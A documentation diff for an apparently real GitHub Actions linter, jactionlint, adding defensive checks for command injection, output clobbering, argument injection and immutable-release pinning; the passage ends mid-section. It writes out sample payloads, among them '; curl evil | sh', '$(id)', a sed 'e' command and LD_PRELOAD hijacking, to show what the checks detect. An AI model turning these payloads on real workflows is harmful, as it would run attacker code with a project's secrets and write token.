@@ -44,6 +44,9 @@ List of checks:
 - [Job ID and step ID uniqueness](#check-job-step-ids)
 - [Hardcoded credentials](#check-hardcoded-credentials)
 - [Dangerous writes to `GITHUB_ENV` and `GITHUB_PATH`](#check-github-env)
+- [Input of an outsider that a script runs as code (pedantic)](#check-command-injection)
+- [Input of an outsider that adds records to `GITHUB_OUTPUT` (pedantic)](#check-output-clobbering)
+- [Free text of an outsider in the program or the options of a command (pedantic)](#check-argument-injection)
 - [Writes to the environment files that lose data](#check-environment-file-redirect)
 - [Packages installed by name](#check-adhoc-packages)
 - [Tools installed without an exact version](#check-unpinned-tools)
@@ -54,11 +57,13 @@ List of checks:
 - [Environment variable names](#check-env-var-names)
 - [Permissions](#permissions)
 - [Reusable workflows](#check-reusable-workflows)
+- [Concurrency deadlock between a workflow and the workflow it calls](#check-concurrency-deadlock)
 - [ID naming convention](#id-naming-convention)
 - [Availability of contexts and special functions](#ctx-spfunc-availability)
 - [Deprecated workflow commands](#check-deprecated-workflow-commands)
 - [The gh command without a token](#check-gh-without-token)
 - [Constant conditions at `if:`](#if-cond-constant)
+- [Events that the workflow never receives (pedantic)](#check-event-name-never-received)
 - [Action metadata syntax validation](#action-metadata-syntax)
 - [Deprecated inputs usage](#deprecated-inputs-usage)
 - [YAML anchors](#yaml-anchors)
@@ -1244,7 +1249,7 @@ Python scripts in a workflow by checking `shell: python` at each step and `defau
 By default, jactionlint checks if `pyflakes` command exists in your system and uses it when found. The `--pyflakes` option
 of `jactionlint` command allows to specify the executable path of pyflakes. Setting empty string by `--pyflakes=` disables
 pyflakes integration explicitly. As with shellcheck, a missing default is noted on stderr and a missing path given with `--pyflakes`
-is an error (exit status 3), see [details](usage.md#external-tools).
+is an error (exit status 3), see [details](usage.md#external-tools). `--ruff` runs [ruff](https://docs.astral.sh/ruff/) instead (see [the usage document](usage.md#external-tools-ruff)).
 
 Since both `${{ }}` expression syntax is invalid as Python, remaining `${{ }}` might confuse pyflakes. To avoid it,
 jactionlint replaces `${{ }}` with underscores. For example `print('${{ matrix.os }}')` is replaced with
@@ -1428,6 +1433,7 @@ jobs:
       - uses: nick-fields/retry@v3
         with:
           command: echo ${{ github.head_ref }}
+          timeout_minutes: 5
       # OK: The shell expands the variable
       - run: echo "$TITLE"
 ```
@@ -1457,7 +1463,7 @@ test.yaml:21:29: "github.head_ref" is potentially untrusted. avoid using it dire
    |                             ^~~~~~~~~~~~~~~
 ```
 
-[Playground](https://jactionlint.jdx.dev/#eNpskL1OAzEQhHs/xSiKFCjOFHSuaChACArSR/ez4QyXNbpdH4rCvTvyxcqPODfWar/xzDiwgxeJtKnDbkesxhAPzgDrp/XLo8PycMCH1zZWlgZitRNt1WtHGEdjPkMliVcSTTfQR5YiPRyryBqLrky7aSVK33KkgCKRDlS3AavkQzzYyRbjuLqGfvOYzlmQg7VUNpuetheyWe5YIBe1VWj2/43OIg3P72+vN5fa2ys+CokD+/qr2HrqGrnrSfv9w3B/CvHjtXWnCUjeJTfZZr7CTJ7FcvqWxd8A3hV//w==)
+[Playground](https://jactionlint.jdx.dev/#eNpskL9Ow0AMh/c8hVVVKgw5BsRyEwsDCMFA9yh/XHKQ+FBsB1Ul746cRm2q5paT5e93n32RPARmxayMbYskSYLU+wRg+7x9ffKwPhzgM0ithcMeSdxIOwnSIAxDknzFgo0XZLEboFPi1B7WQkk0bXLrjS0W/OEjBZAa6QHLOsLGPEi9G7UwDJtL6G8q7ZwD02A15lXW4W4WW+SOC0yLuiJW+2vROSTx5eP97Waevb3glZE9UCi/013ApuK7DqXbP/b3pyF+g9T+VAGYO6dq0iyvMMMltBhVsjaQiskeFoZdrcc/W/0PAOmOiEM=)
 
 `--fix` fixes the findings in `run:` scripts of bash and sh when it can show that the fix does the same: the `${{ }}` is in double
 quotes or single quotes, and the script has no here-document, command substitution or comment around it. The expression is replaced
@@ -2471,6 +2477,9 @@ Each key is a pattern for the repository of the `uses:` value, and the value is 
 - `hash-pin`: a full-length commit SHA is required (for Docker images, a digest). This is the policy of everything that no
   pattern matches.
 - `ref-pin`: any tag, branch or commit SHA is accepted. For Docker images, a tag other than `latest` or a digest is required.
+- `immutable-release`: like `hash-pin`, and with `--online` the tag of an [immutable release](https://docs.github.com/en/code-security/concepts/supply-chain-security/immutable-releases)
+  is accepted as well (`uses: astral-sh/setup-uv@v10.3.0`). Without `--online` it is `hash-pin`: the message says that an immutable release
+  would do. See [below](#check-immutable-release).
 - `any`: nothing is required.
 
 The patterns are `*` (everything), `owner/*`, `owner/repo` and `owner/repo/path` (the path and everything below it).
@@ -2478,6 +2487,38 @@ Owners and repositories are compared case-insensitively. When several patterns m
 they are written in: in the example, `actions/checkout` needs a commit SHA while the other `actions/*` actions only need a ref.
 Reusable workflow calls follow the same patterns. Patterns describe repositories, so a Docker image follows the `*` pattern.
 Invalid patterns and unknown policies are errors when the configuration is read.
+
+<a id="check-immutable-release"></a>
+#### Tags of immutable releases (online)
+
+When a repository publishes its releases as [immutable](https://docs.github.com/en/code-security/concepts/supply-chain-security/immutable-releases),
+GitHub locks the tag of each release (it cannot be moved or deleted) and its assets, so that
+`uses: owner/repo@v1.2.3` runs the same code for as long as the release exists, which is what pinning to a commit is for. The policy
+`immutable-release` of the `policies` option accepts such a tag instead of reporting it:
+
+```yaml
+rules:
+  unpinned-uses:
+    level: error
+    policies:
+      '*': immutable-release
+```
+
+With `--online` a ref is accepted when all of these hold, and is reported as with `hash-pin` otherwise:
+
+- `GET /repos/{owner}/{repo}/releases/tags/{ref}` answers a published release with `"immutable": true`. This is the field of the release
+  object of the REST API (the endpoint "Get a release by tag name"). A tag without a release (a moving tag such as `v4`), a release which
+  was published before the repository turned immutability on, and a draft are not immutable.
+- No branch has the name of the tag, because `uses: owner/repo@v1.2.3` would be ambiguous (see [`ref-confusion`](#check-ref-confusion)): a
+  branch can be pushed by whoever can write to the repository, whatever the release says.
+- The `uses:` is an action or a reusable workflow of a GitHub repository, and the ref is a plain tag name (a ref with a `/`, a branch and a
+  commit SHA are not looked up: a commit is accepted by every policy anyway).
+
+A lookup which fails (403, rate limit, no network, `--online=cache` without the answer) keeps the finding and counts as a skipped
+lookup. It costs one request for each tag of the run that the policy leaves open (also the answer "no release" is cached, like all
+answers), and one for the branch of the same name for each immutable one, which `ref-confusion` and `--fix` share. Nothing is asked for
+the repositories which another policy matches, or for a configuration without `immutable-release`. The setting protects the tag, not the
+author: an immutable release of a repository which was taken over later still runs what its author published.
 
 <a id="check-local-action-checkout"></a>
 ### Local action used before checkout
@@ -2693,6 +2734,76 @@ comment.
 So far, jactionlint supports more than 100 popular actions The data set is embedded at [`popular_actions.go`](https://github.com/jdx/jactionlint/blob/main/popular_actions.go)
 and were automatically collected by [a script][generate-popular-actions]. If you want more checks for other actions, please
 make a request [as an issue][issue-form].
+
+<a id="check-action-input-dependencies"></a>
+## Inputs which only work together
+
+Example input:
+
+```yaml
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      # ERROR: run-id and repository are ignored without github-token
+      - uses: actions/download-artifact@v4
+        with:
+          name: build
+          run-id: ${{ github.event.workflow_run.id }}
+          repository: octo/other
+      # ERROR: one of the timeouts is required
+      - uses: nick-fields/retry@v3
+        with:
+          max_attempts: 3
+          command: make
+      # ERROR: only one of the two identities may be given
+      - uses: google-github-actions/auth@v2
+        with:
+          workload_identity_provider: projects/1/locations/global/workloadIdentityPools/p/providers/g
+          credentials_json: '{"type": "service_account"}'
+```
+
+Output:
+
+```
+test.yaml:10:11: input "run-id" of action "actions/download-artifact@v4" needs "github-token", without it the action ignores it and downloads from the current run. add "github-token" [missing-action-input]
+   |
+10 |           run-id: ${{ github.event.workflow_run.id }}
+   |           ^~~~~~~
+test.yaml:11:11: input "repository" of action "actions/download-artifact@v4" needs "github-token", without it the action ignores it and downloads from the current repository. add "github-token" [missing-action-input]
+   |
+11 |           repository: octo/other
+   |           ^~~~~~~~~~~
+test.yaml:13:15: missing input: action "nick-fields/retry@v3" needs "timeout_minutes" or "timeout_seconds", the action fails with "Must specify either timeout_minutes or timeout_seconds inputs". give one of them [missing-action-input]
+   |
+13 |       - uses: nick-fields/retry@v3
+   |               ^~~~~~~~~~~~~~~~~~~~
+test.yaml:21:11: inputs "workload_identity_provider" and "credentials_json" of action "google-github-actions/auth@v2" exclude each other, the action fails with "must specify exactly one of". give only one of "workload_identity_provider" and "credentials_json" [conflicting-action-inputs]
+   |
+21 |           credentials_json: '{"type": "service_account"}'
+   |           ^~~~~~~~~~~~~~~~~
+```
+
+[Playground](https://jactionlint.jdx.dev/#eNp0kc/O2yAQxO/fU6ysSjkR1KYnTrn21jewMGxsEswidrFrRXn3yvnzyYqUE4KZYX8MlAzkysPXmTo2XwCCLOsKUGpiteq1q0mqinbV7hILZn64ABRURjZgnQRKrD3NKZL1yhYJJ+vkOP1+WgHmIIP53gEkO6KBroboN6elJhW8gR/XK/RBhtrtccIk+5nK5RRpbktN++DhdtumMBMHobIYICekSQYsb5QpuIs6BYyedUEpy3E6fKQb7b/WiuCYhQ0cNoqjcbTJGxjtBd9G9ER9RPUAV69abJXhOP36OGt92lpbGzwmCbK0udAUPBYDudAZnbD+qSM5+7iwj9TZqF+5P8/YX6LIOutXmnW/5S5499nI7ZnX391dG1kyNgYaxjIFh611jmqS5rb7PwDl26jL)
+
+The data set of popular actions knows which inputs exist and which are required, but not that some inputs only work together. A few
+well-known actions have inputs like that, and the mistake is quiet or late: `actions/download-artifact` downloads from the current run
+when `run-id` or `repository` is given without `github-token`, and `nick-fields/retry` fails only when it runs. jactionlint has a table
+for them (`action_input_dependencies.go`, with the source of each entry in a comment), checked for the versions the sources describe:
+
+| Action | Rule | Reported as |
+| --- | --- | --- |
+| `actions/download-artifact` (v4+) | `run-id` and `repository` need `github-token` | `missing-action-input` |
+| `actions/download-artifact` (v4+) | `name` and `artifact-ids` exclude each other | `conflicting-action-inputs` |
+| `nick-fields/retry` | exactly one of `timeout_minutes` and `timeout_seconds` | `missing-action-input`, `conflicting-action-inputs` |
+| `google-github-actions/auth` | exactly one of `workload_identity_provider` and `credentials_json` | `missing-action-input`, `conflicting-action-inputs` |
+| `actions/dependency-review-action` (v4+) | `allow-licenses` and `deny-licenses` exclude each other | `conflicting-action-inputs` |
+
+The version is the major version of the tag, or of the version comment after a commit SHA; a branch and a commit without a comment are
+not judged. A step whose `with:` is an expression, or has an `${{ insert }}` key, is not judged either. A conflict is reported when both
+inputs are written out: two expressions may be empty at run time, which is how a workflow chooses between them. A `run-id` or
+`repository` that is the default expression (`${{ github.run_id }}`) needs no token.
 
 <a id="detect-outdated-popular-actions"></a>
 ## Outdated popular actions detection at `uses:`
@@ -3030,11 +3141,11 @@ jobs:
 Output:
 
 ```
-test.yaml:8:48: a value that is not a literal is written to $GITHUB_ENV in a workflow triggered by "pull_request_target", which runs with secrets and a write token for events that may come from a fork. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. write only literal values and values computed from trusted sources, or pass state with $GITHUB_OUTPUT [github-env]
+test.yaml:8:48: a value that is not a literal is written to $GITHUB_ENV in a workflow triggered by "pull_request_target", which runs with secrets and a write token for events that may come from a fork. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. write only literal values and values computed from trusted sources, or pass state with $GITHUB_OUTPUT (only a value without line breaks, or one between a delimiter that nobody can guess, is safe there: see output-clobbering) [github-env]
   |
 8 |       - run: echo "VERSION=$(cat version.txt)" >> "$GITHUB_ENV"
   |                                                ^~~~~~~~~~~~~~~~
-test.yaml:9:34: untrusted input from the variable TITLE (github.event.pull_request.title) is written to $GITHUB_ENV. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. do not write input that an outsider controls to $GITHUB_ENV; validate it first or pass it to the next step with $GITHUB_OUTPUT [github-env]
+test.yaml:9:34: untrusted input from the variable TITLE (github.event.pull_request.title) is written to $GITHUB_ENV. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. do not write input that an outsider controls to $GITHUB_ENV; validate it first, or pass it to the next step with $GITHUB_OUTPUT (only a value without line breaks, or one between a delimiter that nobody can guess, is safe there: see output-clobbering) [github-env]
   |
 9 |       - run: echo "TITLE=$TITLE" >> "$GITHUB_ENV"
   |                                  ^~~~~~~~~~~~~~~~
@@ -3062,6 +3173,30 @@ The rule `github-env` (in the `default` profile) reports two kinds of writes:
   In the metadata of a composite action, `inputs.*` counts as such an input (also through `env:`): the caller chooses it, and a
   workflow can pass it the title of an issue. This holds without a calling workflow, the action may be used by other repositories.
 
+A script can also read the text of an outsider itself, and the rule follows it from there (this holds for
+[command-injection](#check-command-injection) and [output-clobbering](#check-output-clobbering) as well):
+
+- `gh pr view` and `gh issue view` with a `--json` field that holds free text (`title`, `body`, `comments`, `headRefName`, `files`,
+  `author`, `reviews`, `commits`), `TITLE=$(gh pr view "$N" --json title --jq .title)`. Also `gh api repos/.../pulls` and `.../issues` (and their
+  `comments`, `reviews`, `files` and `commits`). Without a `--jq` filter `gh` prints compact JSON, where a line break of a text is written `\n`, so the
+  text counts as one line. A filter prints a string as it is, with its line breaks: a filter that names a property (`.title`, `.body`,
+  `.comments[].body`, `.head.ref`) counts for what it names, and a filter that is not known (`.`, `.comments`, a variable) counts for what the
+  command can print. Only a filter that provably prints a number, a state, a date or a count (`.number`, `.state`, `.comments | length`) clears it.
+- `git log` and `git show` with a format that prints the subject, the body or the author (`%s`, `%b`, `%B`, `%an`, `%ae`, `--oneline`),
+  `git diff` and `git diff-tree`, `git branch --show-current`, `git rev-parse --abbrev-ref` and `git symbolic-ref --short`, **once the
+  pull request is checked out**: an earlier step of the job runs `actions/checkout` with a `ref` that names its head, or `gh pr checkout`, or a
+  fetch of `refs/pull/N/head`, or the script did one of these before the command. Without that, the history is the one of the repository and
+  the rule leaves it alone.
+
+The name of a branch or of an account that a command prints (`headRefName`, `author`, `git branch --show-current`, `%an`) is one line
+that git and GitHub restrict. It cannot add a variable to the environment, so `github-env` does not report it (CodeQL does the same), but
+`command-injection` does: `eval "git checkout $BR"` runs it.
+
+These are the models of [CodeQL](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/untrusted_gh_command.yml)
+([git](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/untrusted_git_command.yml)). Only the output of a command
+substitution counts (`$(...)`), a value that was cut down or checked is accepted as for any other input, and a number or a state is not free
+text. The message names the command: `untrusted input from the output of "gh pr view --json title" is written to $GITHUB_ENV`.
+
 A value that cannot carry what makes the write dangerous is accepted: for `$GITHUB_ENV` a value without newlines
 (`tr -d '\n'`, `tr '\n' ' '`, `head -n 1`, `sed ':a;N;$!ba;s/\n/ /g'`, `${v//$'\n'/}`), and for both files a value cut down to
 letters, digits and a few harmless characters (`sed 's/[^a-zA-Z0-9-]/-/g'`, `tr -cd 'a-z0-9'`, `${v//[^a-zA-Z0-9]/}`) or checked
@@ -3073,13 +3208,250 @@ to hold no dot, slash or colon. A token minted by an earlier step of the job (th
 
 `echo "VERSION=1.0" >> "$GITHUB_ENV"` and `echo "$HOME/.cargo/bin" >> "$GITHUB_PATH"` are fine. Use `$GITHUB_OUTPUT` to pass
 state between steps (`echo "version=$(cat version.txt)" >> "$GITHUB_OUTPUT"` is not reported) and validate or avoid the value
-otherwise. The rule understands `>>` and `>`, `tee`, groups (`{ ...; } >> "$GITHUB_ENV"`), here documents and a file name held
+otherwise. `$GITHUB_OUTPUT` is not a safe place for every value either: a value that can hold a line break, such as the body of a
+comment, adds records of its own there, and a multi-line record with a constant delimiter is no better. The check
+[output-clobbering](#check-output-clobbering) reports that. The rule understands `>>` and `>`, `tee`, groups (`{ ...; } >> "$GITHUB_ENV"`), here documents and a file name held
 in another variable. Scripts of `bash` and `sh` are parsed; for `pwsh`, `powershell` and `cmd` the rules look at the lines that
 mention `$env:GITHUB_ENV` or `%GITHUB_ENV%` together with a redirection or `Out-File`, `Add-Content`, `Set-Content` and
 `Tee-Object`.
 
 To turn the rule off, put `github-env: off` in the `rules` section of the [configuration file](config.md) or write
 `# jactionlint ignore=github-env` after a reason.
+
+<a id="check-command-injection"></a>
+## Input of an outsider that a script runs as code (pedantic)
+
+Example input:
+
+```yaml
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: bash -c "echo $BODY"
+        env:
+          BODY: ${{ github.event.comment.body }}
+```
+
+Output:
+<!-- Skip update output -->
+```
+test.yaml:8:14: warning: untrusted input from the variable BODY (github.event.comment.body) is expanded into the command string of "bash -c", which the shell then parses as code: a value with shell syntax (a ;, a quote or $(...)) runs commands in this step. pass the value as an argument of the command string instead (bash -c 'cmd "$1"' _ "$VALUE"), or validate it against a fixed list or a strict pattern first [command-injection]
+  |
+8 |       - run: bash -c "echo $BODY"
+  |              ^~~~~~~~~~~~~~~~~~~~
+```
+
+<!-- Skip playground link -->
+
+The output above is from this `rules` section of the [configuration file](config.md):
+
+```yaml
+rules:
+  command-injection: warn
+```
+
+The usual advice for [template injection](#untrusted-inputs) is to pass the input to the script through `env:` and to read it as
+`"$BODY"`. That is safe while the shell only expands the variable, and it is not when the script parses the value again.
+`bash -c "echo $BODY"` builds the command string first and lets a second shell read it, so a comment with `; curl evil | sh` or
+`$(id)` runs commands in the step, with the token and the secrets of the job. The same holds for `eval "$BODY"`, which runs the value
+itself. See CodeQL's [command injection query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-078/CommandInjectionCritical.ql).
+
+The rule `command-injection` (in the `pedantic` profile) reports an environment variable or a variable of the script that holds
+input an outsider controls (the same list of inputs as the expression checks, such as `github.event.comment.body`, `github.head_ref`
+or the title of a pull request) when the script:
+
+- runs it with `eval` or `source <(echo "$BODY")`;
+- expands it into the command string of a shell, `bash -c "echo $BODY"`, also behind `sudo`, `docker run image sh -c "..."` and the like;
+- uses it as the name of a command (`$CMD`, `"$CMD" --flag`, or `CMD=$(echo "$BODY" | sed ...); $CMD`);
+- pipes it into a shell (`echo "$BODY" | bash`, `bash <<< "$BODY"`, `bash <(echo "$BODY")`);
+- feeds it to `xargs -I{} sh -c 'echo {}'`, which puts each line into the command string of the shell;
+- expands it into the program text of an inline interpreter (`python -c`, `node -e`, `perl -e`, `ruby -e`).
+
+In the script of `actions/github-script` it reports the calls of `child_process` that go through a shell (`exec`, `execSync`, and `spawn`,
+`execFile` and their sync forms with `shell: true`), a shell started with `-c`, and `exec.exec(...)` when the untrusted value is the
+program that runs. The value comes from `process.env.NAME` (the step, the job or the workflow set `NAME` to an untrusted expression),
+from `context.payload.*` or from a constant of the script that holds one of them. An argument in an array (`execFileSync('git',
+['log', '--grep', value])`, `exec.exec('git', ['checkout', value])`) is data and is not reported.
+
+A plain `"$BODY"` as the argument of a command is not reported (at most that is argument injection), and neither is a value that is
+only expanded: `bash -c 'echo "$1"' _ "$BODY"`, `bash -c 'echo "$BODY"'` and `eval 'echo "$BODY"'` read the value as data. The rule
+also accepts a value that the script made safe first: checked with an anchored pattern before the use
+(`[[ "$BODY" =~ ^[a-z0-9-]+$ ]] || exit 1`), cut down to letters, digits and a few harmless characters (`tr -cd 'a-z0-9'`,
+`${BODY//[^a-z0-9]/}`, `sed 's/[^a-zA-Z0-9]/-/g'`), quoted for the shell (`printf '%q'`, `${BODY@Q}`), or turned into a number or a hash
+(`wc`, `sha256sum`). A value without newlines is not enough here, because `$(id)` has none. In JavaScript the value is accepted when it
+is wrapped in a call (`Number(x)`, `shellQuote(x)`), cleaned with `.replace(...)` or tested with an anchored regular expression
+(`/^[a-z0-9-]+$/.test(x)`) anywhere in the script.
+
+The rule judges variables like `github-env` does (the last assignment decides, a branch counts together with what was before it), and
+it starts from the same sources, which include the text that the script reads with `gh pr view` and `git log` (see
+[`github-env`](#check-github-env)): `BR=$(gh pr view "$N" --json headRefName --jq .headRefName); eval "git checkout $BR"` is reported.
+Three things are left to other rules: an expression written in the script (`eval "${{ github.event.comment.body }}"` is a finding of
+[template-injection](#untrusted-inputs)), `inputs.*` of a composite action (an action can take a command on purpose), and a
+value that only the output of a command makes untrusted. It does not follow a value through a function of the script
+(`run() { eval "$1"; }; run "$BODY"`), and it does not parse scripts of `pwsh`, `cmd` and `python`.
+
+The rule is `pedantic` because it has no finding yet on a corpus of about 500 repositories (6,900 workflow files), so it has no measured
+false-positive rate, and the policy of this project asks for a real case before a security rule fails a build by default. Each shape it reports has no
+harmless reading once the value is text that an outsider writes, so it can move to the `default` profile when real findings have been reviewed.
+
+To turn the rule off, put `command-injection: off` in the `rules` section of the [configuration file](config.md) or write
+`# jactionlint ignore=command-injection` after a reason.
+
+<a id="check-output-clobbering"></a>
+## Input of an outsider that adds records to `GITHUB_OUTPUT` (pedantic)
+
+Example input:
+
+```yaml
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    outputs:
+      approved: ${{ steps.gate.outputs.approved }}
+    steps:
+      - id: gate
+        run: |
+          echo "approved=false" >> "$GITHUB_OUTPUT"
+          echo "body=$BODY" >> "$GITHUB_OUTPUT"
+        env:
+          BODY: ${{ github.event.comment.body }}
+```
+
+Output:
+<!-- Skip update output -->
+```
+test.yaml:13:29: warning: untrusted input from the variable BODY (github.event.comment.body) is written to $GITHUB_OUTPUT as the record "body=..." and can hold a line break: an attacker who controls it ends the record and adds others, so it sets the other outputs of the step (steps.gate.outputs.*) that later steps trust. write a value without line breaks (validate it, or cut it down with tr -d '\n'), or write it between a delimiter that nobody can guess (delimiter=$(uuidgen); echo "body<<$delimiter" ...; echo "$delimiter") [output-clobbering]
+   |
+13 |           echo "body=$BODY" >> "$GITHUB_OUTPUT"
+   |                             ^~~~~~~~~~~~~~~~~~~
+```
+
+<!-- Skip playground link -->
+
+The output above is from this `rules` section of the [configuration file](config.md):
+
+```yaml
+rules:
+  output-clobbering: warn
+```
+
+The runner reads `$GITHUB_OUTPUT` line by line. A line `name=value` sets an output, so a value that holds a line break ends
+the record and the rest is read as the next one. A comment whose second line is `approved=true` writes
+`approved=true` after the `approved=false` that the step wrote on purpose, and a later `if: steps.gate.outputs.approved == 'true'`, or a
+job that reads `needs.check.outputs.approved`, believes it. This is the same flaw as [`GITHUB_ENV`](#check-github-env) in a form that does not
+need a variable such as `LD_PRELOAD`. The multi-line form `name<<DELIMITER` has it too when the delimiter is a constant: the
+value can hold the delimiter on a line of its own and go on with more records. See CodeQL's
+[output clobbering query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-074/OutputClobberingHigh.ql).
+
+The rule `output-clobbering` (in the `pedantic` profile) reports input that an outsider controls and that can hold a line break (the same
+list of inputs as the expression checks, such as the body of an issue, a comment or a review and the message of a commit) when it is
+written to `$GITHUB_OUTPUT` in a record (`echo "body=$BODY" >> "$GITHUB_OUTPUT"`, `printf`, `tee`, a group or a here document), alone
+(`echo "$BODY" >> "$GITHUB_OUTPUT"`), or between a constant delimiter. It reports only when the output can be misused: the step has an `id` and the job (or
+the outputs of the action) reads an output of that step other than the one that is written, `steps.gate.outputs.approved` in the example. A
+step with one output that nothing else reads gives the attacker nothing to change. A title, the name of a branch and the name of an
+account are one line and are not reported, and neither is `inputs.*` of a composite action. The text that the script reads with `gh` and `git`
+(see [`github-env`](#check-github-env)) counts when it can hold several lines, such as the body, the comments or the files of a pull request. A step that only trusted people reach is
+not reported either, because the rule cannot judge whether the check is enough: its `if:` or the `if:` of the job reads
+`author_association`, the actor or the user of the event, or the script asks for the permission of the user
+(`gh api repos/$REPO/collaborators/$USER/permission`). A pipeline whose later stage is a program that parses the text
+(`echo "$BODY" | python parse_args.py >> "$GITHUB_OUTPUT"`) is not followed: that program decides what is written.
+
+Where the text is a whole line (nothing constant in front of it, `echo "$BODY" >> "$GITHUB_OUTPUT"`), one line is already a record
+(`approved=true`), so a later stage that keeps the first line (`head -n 1`) or removes the line breaks (`tr -d '\n'`) does not make it
+safe: only a text cut down to letters, digits, `_` and `-` (`tr -cd 'a-z0-9'`), a hash or a checked value does. After a constant name
+(`body=$BODY`) one line is enough. A delimiter is judged as the shell expands it: the arguments of `printf 'body<<%s\n' "$d"` are
+followed, a variable that copies a secret or the token (`d=$DELIM` with `DELIM: ${{ secrets.DELIM }}`) is unguessable, and a time such as
+`date +%s` is not (`date +%s%N` is).
+
+Fix it by writing a value without line breaks, or by using a delimiter that nobody can guess:
+
+```sh
+delimiter=$(uuidgen)
+{
+  echo "body<<$delimiter"
+  echo "$BODY"
+  echo "$delimiter"
+} >> "$GITHUB_OUTPUT"
+```
+
+The rule accepts a delimiter taken from `uuidgen`, `openssl rand`, `/dev/urandom`, `$RANDOM` or `mktemp`, a value that was validated before
+(`[[ "$BODY" =~ ^[0-9]+$ ]] || exit 1`), the first line (`head -n 1`), a value cut down to a set of characters (`tr -cd`, `${BODY//[^0-9]/}`,
+`sed 's/[^a-z0-9]/-/g'`), without line breaks (`tr -d '\n'`), or reduced to a number or a hash (`wc`, `sha256sum`, `grep -c`). It judges variables like
+`github-env` does. It does not look at what other actions write to `$GITHUB_OUTPUT` (an artifact written to it is the business of
+[untrusted-artifact](#check-untrusted-artifact)), and the workflow command `::set-output` that prints the value is not analyzed.
+
+To turn the rule off, put `output-clobbering: off` in the `rules` section of the [configuration file](config.md) or write
+`# jactionlint ignore=output-clobbering` after a reason.
+
+<a id="check-argument-injection"></a>
+## Free text of an outsider in the program or the options of a command (pedantic)
+
+Example input:
+
+```yaml
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  render:
+    runs-on: ubuntu-latest
+    steps:
+      - run: sed "s/PLACEHOLDER/$BODY/g" template.txt > out.txt
+        env:
+          BODY: ${{ github.event.comment.body }}
+```
+
+Output:
+<!-- Skip update output -->
+```
+test.yaml:8:14: warning: free text of an outsider from the variable BODY (github.event.comment.body) is expanded into the program of sed: a value with a slash ends the command and the rest is a program of its own. GNU sed runs commands with `e` (`a/g;1e id;#`) and writes files with `w`. keep the value out of the program text: read it from the environment in awk (ENVIRON["BODY"]) or perl ($ENV{BODY}), or cut it down to letters and digits first [argument-injection]
+  |
+8 |       - run: sed "s/PLACEHOLDER/$BODY/g" template.txt > out.txt
+  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~
+```
+
+<!-- Skip playground link -->
+
+The output above is from this `rules` section of the [configuration file](config.md):
+
+```yaml
+rules:
+  argument-injection: warn
+```
+
+Passing the input through `env:` makes `"$BODY"` safe as an argument, but not as part of the program that a command reads. In
+`sed "s/PLACEHOLDER/$BODY/g"` a slash in the value ends the `s` command and the rest is a program of its own: GNU sed runs a
+command with the `e` command and the `e` flag (`a/g;1e id;#`) and writes files with `w`. The program of `awk` can call `system()`.
+`find -exec $BODY` runs the value, an unquoted value in `find` is split into words that can add `-exec`, and a quoted value in the place of a
+predicate (`find . "$BODY"`, after the first path or after a predicate) is read as a predicate when it starts with a dash (`-delete`, `-exec`).
+The first path, the operands of the predicates (`-name "$TITLE"`) and the arguments of the command of `-exec` are not such places. For `wget`, `curl` and
+`git clone` a value that starts a word and starts with a dash is an option: `-o`, `--output`, `--upload-pack`. See CodeQL's [argument injection query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-088/ArgumentInjectionCritical.ql)
+and [its commands](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/argument_injection_sinks.yml).
+
+The rule `argument-injection` (in the `pedantic` profile) reports free text that an outsider types (a body, a comment, a title,
+a commit message, the name of an author, and what a script reads with `gh pr view` and `git log`, see [`github-env`](#check-github-env))
+when it is expanded in one of these places. It leaves out the name of a branch, of a label and of an account, as CodeQL does: git does not
+accept a branch that starts with a dash, and the characters of an account name are fixed. A single quoted program (`sed 's/a/$BODY/'`)
+does not expand anything and is fine, and so are the value of `awk -v name="$BODY"`, a pattern (`find -name "$TITLE"`), a value after
+`--`, and a value in the middle of a word (`"dir/$BODY.tgz"`). For the options of `curl`, `wget` and `git clone` the word must be an operand (not the value of an option, such as `--branch "$BODY"`
+or `-d "$BODY"`, and not after `--`), and the value must be the environment variable as the step got it: a value that the script computed first
+is not followed. `tar`, `zip`, `unzip` and `rsync` are not covered, because the rule does not know their options well enough to tell an operand from the value of an option.
+
+The only safe shape of a value for a program is letters, digits, `_` and `-`: `tr -cd 'a-z0-9-'`, `${BODY//[^a-z0-9]/}`,
+`sed 's/[^a-z0-9-]//g'` or a check with an anchored pattern before the use. A dot and a slash are enough to break a sed program. An expression
+written in the script (`sed "s/a/${{ github.event.comment.body }}/"`) is a finding of [template-injection](#untrusted-inputs).
+`inputs.*` of a composite action is not judged. The rule does not know who may comment: a command that only maintainers can start is
+reported like any other.
+
+To turn the rule off, put `argument-injection: off` in the `rules` section of the [configuration file](config.md) or write
+`# jactionlint ignore=argument-injection` after a reason.
 
 <a id="check-environment-file-redirect"></a>
 ## Writes to the environment files that lose data
@@ -3339,6 +3711,70 @@ A credential variable that does not hold a long-lived credential is not one: `NO
 that `actions/setup-node` writes, so that npm falls back to the OIDC token (the documented way to publish to npm with provenance),
 and a variable set from the output of `rust-lang/crates-io-auth-action` or `NuGet/login` of the same job (for example
 `CARGO_REGISTRY_TOKEN: ${{ steps.auth.outputs.token }}`) holds a token that is valid for minutes. Both are trusted publishing.
+
+With the option `pedantic` (on under the `pedantic` profile) the rule also looks at the jobs that **do** use trusted publishing
+([zizmor#1968](https://github.com/zizmorcore/zizmor/issues/1968), [#237](https://github.com/zizmorcore/zizmor/issues/237),
+[#938](https://github.com/zizmorcore/zizmor/issues/938)). The OIDC token replaces a stored secret, but everything that runs in the job
+while it can request the token can use it to publish:
+
